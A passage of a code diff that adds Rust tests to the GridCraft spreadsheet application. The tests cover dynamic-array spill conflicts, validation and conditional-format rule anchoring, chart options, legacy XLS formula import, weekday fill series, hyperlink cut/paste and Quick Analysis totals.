+    let mut fresh = (**wb).clone();
+    gridcraft_calc::Calc::new().recalc_all(&mut fresh);
+    let (a, b) = (wb.active().unwrap(), fresh.active().unwrap());
+    for row in 0..30 {
+        for col in 0..12 {
+            let cell = CellRef { row, col };
+            assert_eq!(a.value(cell), b.value(cell), "{cell} in memory vs after a full recalc");
+        }
+    }
+}
+
+#[test]
+fn filling_a_formula_next_to_a_spill_matches_a_full_recalc() {
+    // Found by the command-sequence fuzzer: C14 spills along row 14; filling `=D14:E18` over
+    // E13:F13 puts two array formulas whose areas run into that spill and into each other. The
+    // incremental pass left F13 as #SPILL! while a full recalc gave F13 its array and C14
+    // #SPILL!. The spill that already exists keeps its cells (as in Excel), in both.
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "B18", "values": [[1], [2], [3], [4], [5], [6], [7]]})).unwrap();
+    s.execute("cell.set", json!({"cell": "C14", "input": "=TRANSPOSE(B18:B24)"})).unwrap();
+    s.execute("selection.set", json!({"range": "E13"})).unwrap();
+    s.execute("range.fill", json!({"range": "E13:F13", "input": "=D14:E18"})).unwrap();
+    assert_eq!(v(&s, "C14"), Value::Number(1.0));
+    assert_eq!(v(&s, "I14"), Value::Number(7.0));
+    assert_eq!(v(&s, "F13"), Value::Error(gridcraft_core::CellError::Spill));
+    assert_matches_full_recalc(&s);
+}
+
+#[test]
+fn overlapping_spills_keep_the_one_that_exists_whichever_anchor_is_first() {
+    use gridcraft_core::CellError::Spill;
+    // E10 spills along row 10, F8 down over F10: F8 is first in reading order, E10 may be first
+    // to spill. Excel keeps whichever spilled first.
+    for (first, second) in [(("E10", "=SEQUENCE(1,3)"), ("F8", "=SEQUENCE(5)")), (("F8", "=SEQUENCE(5)"), ("E10", "=SEQUENCE(1,3)"))] {
+        let mut s = s();
+        s.execute("cell.set", json!({"cell": first.0, "input": first.1})).unwrap();
+        s.execute("cell.set", json!({"cell": second.0, "input": second.1})).unwrap();
+        assert_ne!(v(&s, first.0), Value::Error(Spill), "{} keeps its cells", first.0);
+        assert_eq!(v(&s, second.0), Value::Error(Spill), "{} is blocked", second.0);
+        assert_matches_full_recalc(&s);
+        // Clearing the winner lets the other one spill.
+        s.execute("edit.clearContents", json!({"range": first.0})).unwrap();
+        assert_ne!(v(&s, second.0), Value::Error(Spill), "{} spills once {} is cleared", second.0, first.0);
+        assert_matches_full_recalc(&s);
+    }
+}
+
+#[test]
+fn a_spill_growing_into_another_and_back_matches_a_full_recalc_at_every_step() {
+    use gridcraft_core::CellError::Spill;
+    // Both arrays already spill; F8 (first in reading order) grows down over E10's spill, is
+    // #SPILL! because E10 holds those cells (as in Excel), shrinks back and spills again, then the
+    // steps are undone, redone, edited inside the contested area and cleared. Every state must
+    // match a full recalc.
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "H1", "input": "1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "F8", "input": "=SEQUENCE(H1)"})).unwrap();
+    s.execute("cell.set", json!({"cell": "E10", "input": "=SEQUENCE(1,3)*10"})).unwrap();
+    assert_eq!(v(&s, "G10"), Value::Number(30.0));
+    assert_matches_full_recalc(&s);
+    let steps: [(&str, serde_json::Value); 9] = [
+        ("cell.set", json!({"cell": "H1", "input": "5"})),
+        ("cell.set", json!({"cell": "E10", "input": "=SEQUENCE(1,2)*10"})),
+        ("cell.set", json!({"cell": "H1", "input": "1"})),
+        ("edit.undo", json!({})),
+        ("edit.undo", json!({})),
+        ("edit.redo", json!({})),
+        ("cell.set", json!({"cell": "F11", "input": "x"})),
+        ("cell.set", json!({"cell": "H1", "input": "2"})),
+        ("edit.clearContents", json!({"range": "E8:F10"})),
+    ];
+    for (i, (id, params)) in steps.iter().enumerate() {
+        s.execute(id, params.clone()).unwrap();
+        assert_matches_full_recalc(&s);
+        if i == 0 {
+            // Both held a spill: E10 holds F10, so it keeps it and F8 is blocked.
+            assert_eq!(v(&s, "F8"), Value::Error(Spill));
+            assert_eq!(v(&s, "F10"), Value::Number(20.0));
+        }
+        if i == 2 {
+            assert_eq!(v(&s, "E10"), Value::Number(10.0));
+            assert_eq!(v(&s, "F10"), Value::Number(20.0));
+        }
+        if i == 3 {
+            // Undone back to the grown F8, blocked again.
+            assert_eq!(v(&s, "F8"), Value::Error(Spill));
+            assert_eq!(v(&s, "F10"), Value::Number(20.0));
+        }
+        if i == 8 {
+            assert_eq!((v(&s, "F8"), v(&s, "E10"), v(&s, "F9")), (Value::Empty, Value::Empty, Value::Empty));
+        }
+    }
+}
+
+#[test]
+fn overlapping_spills_with_no_history_go_to_the_earlier_anchor() {
+    use gridcraft_core::CellError::Spill;
+    // A workbook calculated for the first time (a file that carries no layout) has no entry
+    // order: the anchor first in reading order wins, whatever order the formulas were set in.
+    for order in [["E10", "F8"], ["F8", "E10"]] {
+        let mut s = s();
+        for a in order {
+            let input = if a == "E10" { "=SEQUENCE(1,3)" } else { "=SEQUENCE(5)" };
+            s.execute("cell.set", json!({"cell": a, "input": input})).unwrap();
+        }
+        let mut fresh = (*s.doc().unwrap().wb).clone();
+        for i in 0..fresh.sheets.len() {
+            let sh = fresh.sheet_mut(i).unwrap();
+            sh.spill.clear();
+            sh.spill_ranges.clear();
+        }
+        gridcraft_calc::Calc::new().recalc_all(&mut fresh);
+        let a = fresh.active().unwrap();
+        let cell = |r: &str| a.value(CellRef::parse(r).unwrap());
+        assert_ne!(cell("F8"), Value::Error(Spill), "order {order:?}");
+        assert_eq!(cell("E10"), Value::Error(Spill), "order {order:?}");
+    }
+}
+
+#[test]
+fn multi_area_rule_formulas_are_relative_to_the_top_left_cell_of_all_areas() {
+    // Issue #3152: Excel writes the formula for the top-left cell of all the areas (H26), whatever
+    // order they are listed in, not for the first area listed (H62).
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "F26:F27", "values": [[4], [5]]})).unwrap();
+    s.execute("data.validation", json!({"range": "H62:H68,H26:H27,H93:H95", "type": "custom", "formula1": "=MOD($H26,$F26)=0"})).unwrap();
+    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
+    assert!(ok(&mut s, "H26", "4"));
+    assert!(ok(&mut s, "H26", "8"));
+    assert!(!ok(&mut s, "H26", "3"));
+    assert!(ok(&mut s, "H27", "10"));
+    assert!(!ok(&mut s, "H27", "4"));
+
+    // Conditional formats anchor on the same cell: `=D2>0` on D5:D6,D2:D3 checks D2 at D2.
+    s.execute("range.setValues", json!({"range": "D2:D6", "values": [[1], [0], [0], [1], [0]]})).unwrap();
+    s.execute("home.conditionalFormat", json!({"range": "D5:D6,D2:D3", "rule": {"type": "expression", "formula": "=D2>0", "preset": "greenFill"}}))
+        .unwrap();
+    let wb = s.doc().unwrap().wb.clone();
+    let mut cache = crate::cf::CfCache::new();
+    let mut styled = |c: &str| cache.look(&wb, 0, CellRef::parse(c).unwrap()).and_then(|l| l.style).is_some();
+    assert_eq!([styled("D2"), styled("D3"), styled("D5"), styled("D6")], [true, false, true, false]);
+}
+
+#[test]
+fn removing_a_rules_top_left_cell_rewrites_its_formulas_for_the_new_one() {
+    let mut s = s();
+    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
+    let f1 = |s: &Session| s.doc().unwrap().wb.active().unwrap().validations[0].f1.clone();
+
+    // One area: clearing A1 off A1:A9 leaves A2:A9, whose cells still check themselves.
+    s.execute("data.validation", json!({"range": "A1:A9", "type": "custom", "formula1": "=A1>10"})).unwrap();
+    s.execute("data.validation", json!({"range": "A1", "clear": true})).unwrap();
+    assert_eq!(f1(&s), "A2>10");
+    assert!(ok(&mut s, "A2", "20"));
+    assert!(!ok(&mut s, "A2", "5"));
+    s.execute("data.validation", json!({"range": "A1:A9", "clear": true})).unwrap();
+
+    // Several areas: clearing H26 moves the top-left cell to H27, where `$H27,$F27` is checked.
+    s.execute("range.setValues", json!({"range": "F26:F27", "values": [[4], [5]]})).unwrap();
+    s.execute("data.validation", json!({"range": "H62:H68,H26:H27", "type": "custom", "formula1": "=MOD($H26,$F26)=0"})).unwrap();
+    s.execute("data.validation", json!({"range": "H26", "clear": true})).unwrap();
+    assert_eq!(f1(&s), "MOD($H27,$F27)=0");
+    assert!(ok(&mut s, "H27", "10"));
+    assert!(!ok(&mut s, "H27", "4"));
+    // Absolute and literal formulas don't move.
+    s.execute("data.validation", json!({"range": "J1:J3", "type": "list", "formula1": "=$B$1:$B$2"})).unwrap();
+    s.execute("data.validation", json!({"range": "J1", "clear": true})).unwrap();
+    let dv = s.doc().unwrap().wb.active().unwrap().validations.iter().find(|d| d.ranges[0].a1() == "J2:J3").unwrap().f1.clone();
+    assert_eq!(dv, "$B$1:$B$2");
+
+    // Conditional formats: Clear Rules on D2 drops the D2:D3 area, and D5:D6 keeps reading itself.
+    s.execute("range.setValues", json!({"range": "D2:D6", "values": [[1], [0], [0], [0], [1]]})).unwrap();
+    s.execute("home.conditionalFormat", json!({"range": "D5:D6,D2:D3", "rule": {"type": "expression", "formula": "=D2>0", "preset": "greenFill"}}))
+        .unwrap();
+    s.execute("range.setValues", json!({"range": "E2:E6", "values": [[1], [0], [0], [0], [1]]})).unwrap();
+    s.execute("range.setValues", json!({"range": "G2:G6", "values": [[0], [9], [9], [9], [0]]})).unwrap();
+    s.execute(
+        "home.conditionalFormat",
+        json!({"range": "E5:E6,E2:E3", "rule": {"type": "cellIs", "operator": "greater", "value": "=G2", "preset": "lightRedFill"}}),
+    )
+    .unwrap();
+    s.execute("home.clearRules", json!({"range": "D2,E2"})).unwrap();
+    let rules: Vec<gridcraft_model::CfRule> = s.doc().unwrap().wb.active().unwrap().cond_formats.iter().map(|c| c.rule.clone()).collect();
+    assert!(rules.iter().any(|r| matches!(r, gridcraft_model::CfRule::Expression { formula, .. } if formula == "D5>0")), "{rules:?}");
+    assert!(rules.iter().any(|r| matches!(r, gridcraft_model::CfRule::CellIs { a, .. } if a == "G5")), "{rules:?}");
+    let wb = s.doc().unwrap().wb.clone();
+    let mut cache = crate::cf::CfCache::new();
+    let mut styled = |c: &str| cache.look(&wb, 0, CellRef::parse(c).unwrap()).and_then(|l| l.style).is_some();
+    assert_eq!([styled("D5"), styled("D6"), styled("E5"), styled("E6")], [false, true, false, true]);
+}
+
 #[test]
 fn samples_build() {
     for (name, _) in crate::sample::SAMPLES {
@@ -2840,6 +3489,21 @@ fn a_spill_that_goes_away_unblocks_another() {
 }
 
 #[test]
+fn a_contested_spill_area_stays_with_its_array_after_reopening() {
+    // F13's array wants F14:G14, which C14's array already fills, so F13 is #SPILL!. The file
+    // can only cache #VALUE! for it; reopening (which recalculates) used to hand the area to F13
+    // for coming first in reading order.
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "C14", "input": "=SEQUENCE(1,7)"})).unwrap();
+    s.execute("cell.set", json!({"cell": "F13", "input": "=SEQUENCE(5,2)"})).unwrap();
+    assert_eq!(v(&s, "F13"), Value::Error(gridcraft_core::CellError::Spill));
+    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
+    s.execute("file.open", json!({"name": "contested.xlsx", "base64": saved["base64"]})).unwrap();
+    assert_eq!(v(&s, "F13"), Value::Error(gridcraft_core::CellError::Spill));
+    assert_eq!((v(&s, "C14"), v(&s, "G14"), v(&s, "I14")), (Value::Number(1.0), Value::Number(5.0), Value::Number(7.0)));
+}
+
+#[test]
 fn an_array_reading_another_arrays_spill_is_updated() {
     // G5 is evaluated before D11 in the same pass, so it first reads D11's old spill.
     let mut s = s();
@@ -2861,6 +3525,19 @@ fn indirect_reads_a_spill_laid_out_in_the_same_pass() {
     assert_eq!(v(&s, "E5"), Value::Number(9.0));
     s.execute("formulas.calculateNow", json!({})).unwrap();
     assert_eq!(v(&s, "E5"), Value::Number(9.0));
+}
+
+#[test]
+fn inserting_rows_lays_out_spills_where_the_formulas_moved() {
+    // D1's array grows with the inserted rows to D1:D10 and C10's array moves down to C12:E14:
+    // the area C10:E12 it filled before the insertion blocks neither of them.
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "D1", "input": "=SEQUENCE(ROWS(A2:A9))"})).unwrap();
+    s.execute("cell.set", json!({"cell": "C8", "input": "=1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "C10", "input": "=SEQUENCE(3,3)"})).unwrap();
+    s.execute("home.insertRows", json!({"rows": "3:4"})).unwrap();
+    assert_eq!((v(&s, "D1"), v(&s, "D10")), (Value::Number(1.0), Value::Number(10.0)));
+    assert_eq!((v(&s, "C12"), v(&s, "D12"), v(&s, "E14")), (Value::Number(1.0), Value::Number(2.0), Value::Number(9.0)));
 }
 
 #[test]
@@ -3017,7 +3694,7 @@ fn calculation_options_enable_iterative_calculation() {
     assert!(!s.doc().unwrap().calc.circular.is_empty());
     // Switching it on recalculates the loop.
     let r = s.execute("formulas.calculationOptions", json!({"iterative": true})).unwrap();
-    assert_eq!(r, json!({"mode": "Automatic", "iterative": true, "maxIterations": 100, "maxChange": 0.001}));
+    assert_eq!(r, json!({"mode": "Automatic", "iterative": true, "maxIterations": 100, "maxChange": 0.001, "precisionAsDisplayed": false}));
     near(&s, "A1", 10.0);
     near(&s, "A2", 10.0);
     assert!(s.doc().unwrap().calc.circular.is_empty());
@@ -3122,6 +3799,21 @@ fn every_chart_kind_survives_xlsx() {
             }
         }
     }
+}
+
+#[test]
+fn chart_set_doughnut_hole_and_angle() {
+    let mut s = s();
+    chart_data(&mut s);
+    s.execute("insert.chart", json!({"type": "doughnut", "range": "A1:B7"})).unwrap();
+    s.execute("chart.set", json!({"holeSize": 5, "firstSliceAngle": 400})).unwrap();
+    s.execute("chart.set", json!({"holeSize": 200})).unwrap();
+    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
+    assert_eq!((c.hole_size, c.first_slice_angle), (90, 40));
+    s.execute("chart.set", json!({"holeSize": 25, "firstSliceAngle": 180})).unwrap();
+    reopen(&mut s);
+    let c = &s.doc().unwrap().wb.active().unwrap().charts[0];
+    assert_eq!((c.kind, c.hole_size, c.first_slice_angle), (gridcraft_model::ChartKind::Doughnut, 25, 180));
 }
 
 #[test]
@@ -3310,6 +4002,41 @@ fn switch_row_column_follows_inserted_and_deleted_lines() {
     assert_eq!(s.doc().unwrap().wb.active().unwrap().charts[0].source, None);
 }
 
+/// Sets the first chart's source on Sheet1 as a file might have left it.
+fn set_chart_source(s: &mut Session, source: &str) {
+    let wb = std::sync::Arc::make_mut(&mut s.active_mut().unwrap().wb);
+    wb.sheet_mut(0).unwrap().charts[0].source = Some(source.into());
+}
+
+#[test]
+fn a_chart_source_already_broken_survives_an_unrelated_edit() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["", "Q1", "Q2"], ["North", 1, 2], ["South", 3, 4]]})).unwrap();
+    s.execute("insert.chart", json!({"range": "A1:C3", "type": "column", "at": "F1"})).unwrap();
+    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=Sheet1!$A$1"})).unwrap();
+    set_chart_source(&mut s, "#REF!");
+    // A series reads the name, so the rename rewrites this chart; the source it doesn't use is
+    // left broken as it was.
+    let wb = std::sync::Arc::make_mut(&mut s.active_mut().unwrap().wb);
+    wb.sheet_mut(0).unwrap().charts[0].series[0].values = "=Rate".into();
+    s.execute("formulas.defineName", json!({"name": "Fee", "oldName": "Rate", "refersTo": "=Sheet1!$A$1"})).unwrap();
+    let chart = s.doc().unwrap().wb.sheet(0).unwrap().charts[0].clone();
+    assert_eq!(chart.series[0].values, "=Fee");
+    assert_eq!(chart.source.as_deref(), Some("#REF!"));
+}
+
+#[test]
+fn deleting_a_chart_source_sheet_drops_the_source() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["", "Q1", "Q2"], ["North", 1, 2], ["South", 3, 4]]})).unwrap();
+    s.execute("insert.chart", json!({"range": "A1:C3", "type": "column", "at": "F1"})).unwrap();
+    s.execute("home.insertSheet", json!({})).unwrap();
+    set_chart_source(&mut s, "Sheet2!A1:C3");
+    // The edit breaks the source, so it goes.
+    s.execute("home.deleteSheet", json!({"sheet": "Sheet2"})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.sheet(0).unwrap().charts[0].source, None);
+}
+
 #[test]
 fn ink_strokes_and_ink_to_shape() {
     let mut s = s();
@@ -3340,9 +4067,12 @@ fn xlsb_import_keeps_cached_values_and_reports_limits() {
         assert!(s.doc().unwrap().display_title().ends_with(".xlsx"));
         assert_eq!(v(&s, "A1"), Value::Number(42.0));
         assert_eq!(v(&s, "B1"), Value::from("Original data"));
-        assert!(s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("A1").unwrap()).unwrap().formula.is_none());
+        assert_eq!(
+            s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("A1").unwrap()).unwrap().formula.as_ref().map(|f| f.text.as_str()),
+            Some("42")
+        );
         s.execute("cell.set", json!({"cell": "B1", "input": "Changed"})).unwrap();
-        assert_eq!(v(&s, "A1"), Value::Number(42.0)); // Imported formula caches are constants.
+        assert_eq!(v(&s, "A1"), Value::Number(42.0));
         let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
         s.execute("file.open", json!({"name": "imported.xlsx", "base64": saved["base64"]})).unwrap();
         assert_eq!(v(&s, "A1"), Value::Number(42.0));
@@ -3399,6 +4129,8 @@ fn xls_fixture() -> Vec<u8> {
     let mut put = |at: usize, v: &[u8]| b[at..at + v.len()].copy_from_slice(v);
     put(0, &[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
     put(26, &3u16.to_le_bytes());
+    // The byte order mark [MS-CFB] 2.2 requires; craft-cfb refuses a header without it.
+    put(28, &0xFFFEu16.to_le_bytes());
     put(30, &9u16.to_le_bytes());
     put(32, &6u16.to_le_bytes());
     put(44, &1u32.to_le_bytes());
@@ -3461,6 +4193,79 @@ fn xls_import_keeps_formulas_and_never_saves_back_to_xls() {
     assert_eq!(v(&s, "A2"), Value::Number(100.0));
     assert!(s.execute("file.saveBytes", json!({"format": "xls"})).is_err());
     assert!(s.execute("file.saveBytes", json!({"format": "xlsx"})).is_ok());
+}
+
+#[test]
+fn xls_formulas_calculate_with_legacy_implicit_intersection() {
+    // Data!A1 = 11, B1:G1 = 1, A2 = 5, A3 = 7. Report!B1:G1 are filled, so a formula in Report!A1
+    // that spilled would show #SPILL!. Every cached result is 0, so the values below are GridCraft's.
+    fn rec(id: u16, payload: &[u8]) -> Vec<u8> {
+        [&id.to_le_bytes()[..], &(payload.len() as u16).to_le_bytes(), payload].concat()
+    }
+    let u16s = |v: &[u16]| v.iter().flat_map(|x| x.to_le_bytes()).collect::<Vec<u8>>();
+    let bof = |dt: u16| rec(0x0809, &[&0x0600u16.to_le_bytes()[..], &dt.to_le_bytes(), &[0; 12]].concat());
+    let number = |r: u16, c: u16, n: f64| rec(0x0203, &[&u16s(&[r, c, 0])[..], &n.to_le_bytes()].concat());
+    let formula = |r: u16, c: u16, rgce: &[u8]| {
+        rec(0x0006, &[&u16s(&[r, c, 0])[..], &0f64.to_le_bytes(), &[0; 6], &(rgce.len() as u16).to_le_bytes(), rgce].concat())
+    };
+    let area3d = |r0: u16, r1: u16, c0: u16, c1: u16| [&[0x3Bu8, 0, 0][..], &u16s(&[r0, r1, c0, c1])].concat();
+    let a2a3 = area3d(1, 2, 0, 0);
+    let mut data = bof(0x0010);
+    data.extend([number(0, 0, 11.0), number(1, 0, 5.0), number(2, 0, 7.0)].concat());
+    (1..7).for_each(|c| data.extend(number(0, c, 1.0)));
+    data.extend(rec(0x000A, &[]));
+    let mut report = bof(0x0010);
+    (1..7).for_each(|c| report.extend(number(0, c, 0.0)));
+    // A1 = Data!A1:G1; B2 = Data!$A$2:$A$3*10; C2 = SQRT(Data!$A$2:$A$3) (row 2: SQRT(5));
+    // H1 = {SUM(Data!$A$2:$A$3*2)}, a one-cell Ctrl+Shift+Enter array.
+    let cse = [&a2a3[..], &[0x1E, 2, 0, 0x05, 0x22, 1, 4, 0]].concat();
+    report.extend(formula(0, 0, &area3d(0, 0, 0xC000, 6 | 0xC000)));
+    report.extend(formula(1, 1, &[&a2a3[..], &[0x1E, 10, 0, 0x05]].concat()));
+    report.extend(formula(1, 2, &[&a2a3[..], &[0x21, 20, 0]].concat()));
+    report.extend(formula(0, 7, &[1, 0, 0, 7, 0]));
+    report.extend(rec(0x0221, &[&u16s(&[0, 0])[..], &[7, 7], &[0; 6], &(cse.len() as u16).to_le_bytes(), &cse].concat()));
+    report.extend(rec(0x000A, &[]));
+    let boundsheet = |pos: u32, name: &str| rec(0x0085, &[&pos.to_le_bytes()[..], &[0, 0, name.len() as u8, 0], name.as_bytes()].concat());
+    let globals = |p1: u32, p2: u32| {
+        [
+            bof(0x0005),
+            boundsheet(p1, "Data"),
+            boundsheet(p2, "Report"),
+            rec(0x01AE, &u16s(&[2, 0x0401])),
+            rec(0x0017, &u16s(&[1, 0, 0, 0])),
+            rec(0x000A, &[]),
+        ]
+        .concat()
+    };
+    let p1 = globals(0, 0).len() as u32;
+    let stream = [globals(p1, p1 + data.len() as u32), data, report].concat();
+    let bytes = gridcraft_xlsx::testing::compound_file(&[("Workbook", &stream)]);
+
+    let mut s = s();
+    s.execute("file.open", json!({"name": "legacy.xls", "base64": crate::io::base64_encode(&bytes)})).unwrap();
+    s.execute("formulas.calculateNow", json!({})).unwrap();
+    let report = |s: &Session, a1: &str| s.doc().unwrap().wb.sheets[1].value(CellRef::parse(a1).unwrap());
+    assert_eq!(report(&s, "A1"), Value::Number(11.0));
+    assert_eq!(report(&s, "B2"), Value::Number(50.0));
+    assert_eq!(report(&s, "C2"), Value::Number(5f64.sqrt()));
+    assert_eq!(report(&s, "H1"), Value::Number(24.0));
+    // Nothing spilled out of A1 or B2.
+    assert_eq!(report(&s, "B1"), Value::Number(0.0));
+    assert_eq!(report(&s, "B3"), Value::Empty);
+    // Saved as .xlsx, the formulas carry no dynamic-array metadata.
+    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
+    let saved = crate::io::base64_decode(r["base64"].as_str().unwrap()).unwrap();
+    let (wb, _) = gridcraft_xlsx::read_xlsx(&saved).unwrap();
+    let f = |a1: &str| wb.sheets[1].cell(CellRef::parse(a1).unwrap()).and_then(|c| c.formula.clone()).unwrap();
+    assert_eq!(f("A1").text, "@Data!A1:G1");
+    assert_eq!((f("H1").text.as_str(), f("H1").array), ("SUM(Data!$A$2:$A$3*2)", gridcraft_core::RangeRef::parse("H1")));
+    let mut sheet = String::new();
+    std::io::Read::read_to_string(
+        &mut zip::ZipArchive::new(std::io::Cursor::new(&saved)).unwrap().by_name("xl/worksheets/sheet2.xml").unwrap(),
+        &mut sheet,
+    )
+    .unwrap();
+    assert!(!sheet.contains("cm=") && !sheet.contains("SINGLE"), "{sheet}");
 }
 
 #[test]
@@ -3862,6 +4667,24 @@ fn fill_series_weekday_out_of_range_step_errors() {
     assert_eq!(v(&s, "A2"), Value::Empty);
 }
 
+/// A step of a million weekdays moves whole weeks at a time instead of visiting every day, and
+/// lands where counting day by day would.
+#[test]
+fn fill_series_weekday_large_step_is_arithmetic() {
+    let mut s = s();
+    // 45005 is Monday 20 March 2023; five weekdays on from a Monday is the next Monday.
+    s.execute("cell.set", json!({"cell": "A1", "input": "45005"})).unwrap();
+    s.execute("edit.fillSeries", json!({"range": "A1:A3", "direction": "columns", "type": "date", "dateUnit": "weekday", "step": 1_000_000}))
+        .unwrap();
+    assert_eq!(v(&s, "A2"), Value::Number(45005.0 + 1_400_000.0));
+    assert_eq!(v(&s, "A3"), Value::Number(45005.0 + 2_800_000.0));
+    s.execute("cell.set", json!({"cell": "B1", "input": "45009"})).unwrap();
+    s.execute("edit.fillSeries", json!({"range": "B1:B3", "direction": "columns", "type": "date", "dateUnit": "weekday", "step": -1})).unwrap();
+    // Friday 24 March 2023 back one weekday at a time: Thursday, Wednesday.
+    assert_eq!(v(&s, "B2"), Value::Number(45008.0));
+    assert_eq!(v(&s, "B3"), Value::Number(45007.0));
+}
+
 #[test]
 fn fill_series_month_leap_year() {
     let s = series_date("2028-01-31", "A1:A3", "month");
@@ -4022,6 +4845,25 @@ fn a_cut_moves_the_sources_notes_hyperlinks_and_merges() {
     // A1:B1 cleared B1, so only the anchor's content travels).
     assert_eq!(v(&s, "D1"), Value::text("x"));
     assert!(v(&s, "A1").is_empty() && v(&s, "B1").is_empty());
+}
+
+/// A cell that holds only a hyperlink (its content cleared) is still part of the block: a
+/// cut must carry the link to the destination instead of dropping it with the source.
+#[test]
+fn a_cut_carries_a_link_only_cell() {
+    let mut s = s();
+    s.execute("insert.link", json!({"cell": "A1", "target": "https://example.com"})).unwrap();
+    let a1 = CellRef::parse("A1").unwrap();
+    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
+    sh.remove_cell(a1);
+    assert!(sh.cell(a1).is_none(), "A1 holds only the link");
+    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
+    s.execute("edit.paste", json!({"at": "D1"})).unwrap();
+
+    let d = s.doc().unwrap();
+    let sh = d.wb.active().unwrap();
+    assert!(!sh.hyperlinks.contains_key(&CellRef::parse("A1").unwrap()), "the link left the source");
+    assert!(sh.hyperlinks.contains_key(&CellRef::parse("D1").unwrap()), "the link arrived at the destination");
 }
 
 /// Page Layout ▸ Print Titles: naming one axis must not clear the other. `print_titles` read
@@ -4539,6 +5381,140 @@ fn a_decrypted_workbook_never_overwrites_its_encrypted_original() {
     std::fs::remove_dir_all(dir).unwrap();
 }
 
+fn quick_analysis_block(s: &mut Session) {
+    for (a, t) in [("A1", "Item"), ("B1", "Q1"), ("C1", "Q2"), ("A2", "x"), ("A3", "y"), ("A4", "z")] {
+        s.execute("cell.set", json!({"cell": a, "input": t})).unwrap();
+    }
+    for (r, (q1, q2)) in [(1.0, 10.0), (2.0, 20.0), (3.0, 30.0)].into_iter().enumerate() {
+        s.execute("cell.set", json!({"cell": format!("B{}", r + 2), "input": q1.to_string()})).unwrap();
+        s.execute("cell.set", json!({"cell": format!("C{}", r + 2), "input": q2.to_string()})).unwrap();
+    }
+}
+
+#[test]
+fn analysis_add_total_writes_formulas_in_one_undo_step() {
+    // Issue #791 (Quick Analysis › Totals).
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    let before = s.doc().unwrap().undo.len();
+    // The header row and the text-only column are skipped; the selection is the default range.
+    s.execute("selection.set", json!({"range": "A1:C4"})).unwrap();
+    let r = s.execute("analysis.addTotal", json!({"function": "sum"})).unwrap();
+    assert_eq!(r["output"], "B5:C5");
+    assert_eq!(v(&s, "B5"), Value::Number(6.0));
+    assert_eq!(v(&s, "C5"), Value::Number(60.0));
+    assert_eq!(v(&s, "A5"), Value::Empty, "text columns get no total");
+    s.execute("analysis.addTotal", json!({"range": "B1:C4", "function": "average", "direction": "rows"})).unwrap();
+    assert_eq!(v(&s, "D2"), Value::Number(5.5));
+    s.execute("analysis.addTotal", json!({"range": "B1:C4", "function": "runningTotal", "overwrite": true})).unwrap();
+    assert_eq!(v(&s, "D4"), Value::Number(6.0), "running total down column B");
+    assert_eq!(v(&s, "E4"), Value::Number(60.0));
+    s.execute("analysis.addTotal", json!({"range": "B1:B4", "function": "percentTotal", "overwrite": true})).unwrap();
+    assert_eq!(v(&s, "C4"), Value::Number(0.5), "overwrite replaces the C column cell next to B");
+    assert_eq!(s.doc().unwrap().undo.len(), before + 4, "one undo step per call");
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(v(&s, "C4"), Value::Number(30.0));
+    // A second sum into the occupied row is refused rather than overwriting.
+    assert!(s.execute("analysis.addTotal", json!({"range": "A1:C4"})).is_err());
+}
+
+#[test]
+fn analysis_add_total_refuses_bad_and_huge_input() {
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    // Empty params on a single cell, unknown function, no numbers, whole columns, no room.
+    assert!(s.execute("analysis.addTotal", json!({})).is_err());
+    assert!(s.execute("analysis.addTotal", json!({"range": "A1:C4", "function": "median"})).is_err());
+    assert!(s.execute("analysis.addTotal", json!({"range": "A1:A4"})).is_err());
+    let before = s.doc().unwrap().undo.len();
+    let r = s.execute("analysis.addTotal", json!({"range": "B:C"})).unwrap();
+    assert_eq!(r["output"], "B5:C5", "whole columns are clipped to the used range");
+    assert_eq!(s.doc().unwrap().undo.len(), before + 1);
+    s.execute("cell.set", json!({"cell": "B1048575", "input": "1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "B1048576", "input": "2"})).unwrap();
+    assert!(s.execute("analysis.addTotal", json!({"range": "B1048575:C1048576"})).is_err(), "no row below the last one");
+    assert!(s.execute("analysis.addTotal", json!({"range": "B1:C1048576", "function": "runningTotal"})).is_err(), "per-cell block over the cap");
+}
+
+#[test]
+fn analysis_results_stay_outside_a_selection_that_extends_past_the_data() {
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    // Data ends in row 4; the selection runs to row 10, so the sum goes in row 11.
+    let r = s.execute("analysis.addTotal", json!({"range": "A1:C10"})).unwrap();
+    assert_eq!(r["output"], "B11:C11");
+    assert_eq!(v(&s, "B11"), Value::Number(6.0));
+    assert_eq!(v(&s, "B5"), Value::Empty);
+    // Per-row blocks and sparklines move out by the selection's size too.
+    let r = s.execute("analysis.addTotal", json!({"range": "B1:C10", "function": "runningTotal", "direction": "rows"})).unwrap();
+    assert_eq!(r["output"], "B12:C14", "per-row block lands below the selection, not inside it");
+    let r = s.execute("analysis.addSparklines", json!({"range": "A1:F4"})).unwrap();
+    assert_eq!(r["output"], "G2:G4");
+    let r = s.execute("analysis.addSparklines", json!({"range": "A1:C8", "direction": "columns"})).unwrap();
